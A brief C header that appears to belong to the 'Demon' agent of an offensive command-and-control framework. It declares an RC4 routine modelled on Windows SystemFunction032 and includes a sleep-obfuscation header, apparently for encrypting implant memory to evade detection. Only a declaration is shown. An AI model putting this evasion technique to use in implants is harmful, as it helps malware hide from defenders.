#ifndef DEMON_RC4CRYPT_H
#define DEMON_RC4CRYPT_H

#include <windows.h>
#include <ntstatus.h>
#include <core/SleepObf.h>

/* RC4 encrypt/decrypt in-place via USTRING structs (same calling convention as SystemFunction032).
 * Key->Length should be 16 bytes; Data->Length is the buffer to cipher. */
NTSTATUS WINAPI RC4CryptUString( USTRING* Data, USTRING* Key );

#endif
